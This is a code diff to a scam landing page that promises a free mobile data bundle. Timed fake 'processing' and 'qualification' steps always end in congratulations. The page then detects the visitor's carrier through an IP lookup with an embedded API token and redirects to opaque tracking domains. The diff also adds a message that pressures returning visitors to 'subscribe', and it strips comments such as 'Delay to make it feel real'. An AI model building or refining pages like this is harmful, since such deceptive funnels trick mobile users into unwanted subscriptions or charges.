@@ -49,10 +49,10 @@ src="https://www.facebook.com/tr?id=1622898892221727&ev=PageView&noscript=1"
 
 <body class="min-h-screen flex items-center justify-center px-4">
 
-<!-- SUBTLE DIM BACKGROUND (ONLY ADDITION) -->
+<!-- SUBTLE DIM BACKGROUND -->
 <div class="fixed inset-0 bg-black/10 pointer-events-none"></div>
 
-<!-- PROCESSING / CHECKING -->
+<!-- PROCESSING -->
 <div id="processBox" class="relative z-10 soft-card rounded-2xl shadow-xl p-8 max-w-md w-full text-center">
   <h1 id="processText" class="text-xl font-extrabold text-blue-600 mb-6">
     Processing… Please wait
@@ -69,7 +69,7 @@ src="https://www.facebook.com/tr?id=1622898892221727&ev=PageView&noscript=1"
     🎉 Congratulations!
   </h1>
 
-  <p class="text-gray-600 mb-4">
+  <p id="offerMessage" class="text-gray-600 mb-4">
     You qualified for the data below:
   </p>
 
@@ -97,13 +97,11 @@ src="https://www.facebook.com/tr?id=1622898892221727&ev=PageView&noscript=1"
   const bundle = params.get("bundle") || "5GB";
   const price = params.get("price") || "100";
 
-  // After 4 seconds → Checking
   setTimeout(() => {
     document.getElementById("processText").innerText =
       "Checking if you qualified…";
   }, 4000);
 
-  // After 10 seconds → Show congratulations
   setTimeout(() => {
     document.getElementById("processBox").classList.add("hidden");
     document.getElementById("congratsBox").classList.remove("hidden");
@@ -115,14 +113,13 @@ src="https://www.facebook.com/tr?id=1622898892221727&ev=PageView&noscript=1"
   }, 5000);
 </script>
 
-<!-- NETWORK DETECTION SCRIPT (Fully Integrated, No Edits to Existing HTML) -->
+<!-- NETWORK DETECTION -->
 <script>
 function detectNetwork() {
   fetch("https://ipinfo.io/json?token=55355b912bdc12")
     .then(res => res.json())
     .then(data => {
       const network = data.org ? data.org.toLowerCase() : "";
-      console.log("Detected network:", network);
 
       if (network.includes("mtn")) {
         window.location.href = "https://covwyxqac.one/cl/3ef5e8553532210c";
@@ -137,19 +134,13 @@ function detectNetwork() {
     });
 }
 
-// Add spinning icon to button on click
 document.addEventListener("DOMContentLoaded", function() {
   const btn = document.querySelector('#congratsBox button');
   if (!btn) return;
 
   btn.addEventListener('click', function() {
-    // Disable button
     btn.disabled = true;
 
-    // Save original content
-    const originalContent = btn.innerHTML;
-
-    // Replace with spinner only
     btn.innerHTML = `
       <svg class="animate-spin inline-block w-5 h-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
         <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
@@ -157,12 +148,28 @@ document.addEventListener("DOMContentLoaded", function() {
       </svg>
     `;
 
-    // Delay to make it feel real
     setTimeout(() => {
       detectNetwork();
     }, 2000);
   });
 });
+</script>
+
+<!-- MESSAGE ROTATION (ONLY ADDITION) -->
+<script>
+  let visited = localStorage.getItem("visited");
+
+  if (!visited) {
+    localStorage.setItem("visited", "true");
+  } else {
+    document.addEventListener("DOMContentLoaded", function () {
+      const msg = document.getElementById("offerMessage");
+      if (msg) {
+        msg.innerText =
+          "⚠️ You may not qualify again. Subscribe now to receive your data bundle.";
+      }
+    });
+  }
 </script>
 
 </body>
